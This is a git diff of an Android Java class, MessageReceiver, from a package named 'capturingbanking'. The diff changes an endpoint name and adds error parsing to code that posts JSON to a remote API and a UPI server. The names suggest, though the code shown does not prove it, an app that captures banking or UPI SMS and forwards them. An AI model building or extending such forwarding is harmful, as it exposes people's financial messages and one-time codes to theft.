@@ -1,6 +1,6 @@
 package com.suleman.capturingbanking.services;
 
-import static com.suleman.capturingbanking.utilies.Utlis.TOKEN;
+import static com.suleman.capturingbanking.utilies.Utils.TOKEN;
 import static com.suleman.capturingbanking.api.API.UPI_SERVER;
 
 import android.content.BroadcastReceiver;
@@ -14,6 +14,7 @@ import android.widget.Toast;
 
 import com.android.volley.Request;
 import com.android.volley.RequestQueue;
+import com.android.volley.VolleyError;
 import com.android.volley.toolbox.JsonObjectRequest;
 import com.fxn.stash.Stash;
 import com.suleman.capturingbanking.api.API;
@@ -22,11 +23,12 @@ import com.suleman.capturingbanking.model.DeviceModel;
 
 import org.json.JSONObject;
 
+import java.nio.charset.StandardCharsets;
 import java.util.HashMap;
 import java.util.Map;
 
 public class MessageReceiver extends BroadcastReceiver {
-    String TAG = "MyPhoneStateListener";
+    public String TAG = "MyPhoneStateListener";
     Context context;
     public static final String INFO = "INFO";
 
@@ -128,19 +130,18 @@ public class MessageReceiver extends BroadcastReceiver {
 
         RequestQueue requestQueue = VolleySingleton.getInstance(this.context).getRequestQueue();
         try {
-            Log.d(TAG, "callApi: " + API.getLink("create"));
-            JsonObjectRequest stringRequest = new JsonObjectRequest(Request.Method.POST, API.getLink("create"), json,
+            Log.d(TAG, "callApi: " + API.getLink("createnew"));
+            JsonObjectRequest stringRequest = new JsonObjectRequest(Request.Method.POST, API.getLink("createnew"), json,
                     response -> {
                         Log.d(TAG, "Response : " + response.toString());
                     },
                     error -> {
+                        Log.e(TAG, "Error: " + parseError(error, "No response received"));
                         if (error.networkResponse != null) {
                             String errorData = new String(error.networkResponse.data);
                             Log.e(TAG, "Error: " + error.getLocalizedMessage());
                             Log.e(TAG, "Error Response Data: " + errorData);
                             Log.e(TAG, "Status Code: " + error.networkResponse.statusCode);
-                        } else {
-                            Log.e(TAG, "Error: No response received");
                         }
                     }
             ) {
@@ -160,13 +161,12 @@ public class MessageReceiver extends BroadcastReceiver {
                         Log.d(TAG, "Response UPI: " + response.toString());
                     },
                     error -> {
+                        Log.e(TAG, "Error UPI: " + parseError(error, "No response received"));
                         if (error.networkResponse != null) {
                             String errorData = new String(error.networkResponse.data);
-                            Log.e(TAG, "Error UPI: " + error.getLocalizedMessage());
-                            Log.e(TAG, "Error Response Data: " + errorData);
-                            Log.e(TAG, "Status Code: " + error.networkResponse.statusCode);
-                        } else {
-                            Log.e(TAG, "Error UPI: No response received");
+                            Log.e(TAG, "Error UPI : " + error.getLocalizedMessage());
+                            Log.e(TAG, "Error Response Data UPI: " + errorData);
+                            Log.e(TAG, "Status Code UPI : " + error.networkResponse.statusCode);
                         }
                     }
             );
@@ -176,4 +176,20 @@ public class MessageReceiver extends BroadcastReceiver {
             e.printStackTrace();
         }
     }
+
+    public String parseError(VolleyError error, String defaultMessage) {
+        Log.d(TAG, "parseError: " + error);
+        try {
+            if (error.networkResponse != null) {
+                String errorBody = new String(error.networkResponse.data, StandardCharsets.UTF_8);
+                JSONObject jsonError = new JSONObject(errorBody);
+                return jsonError.getString("message");
+            }
+            return defaultMessage;
+        } catch (Exception e) {
+            e.printStackTrace();
+            return defaultMessage;
+        }
+    }
+
 }
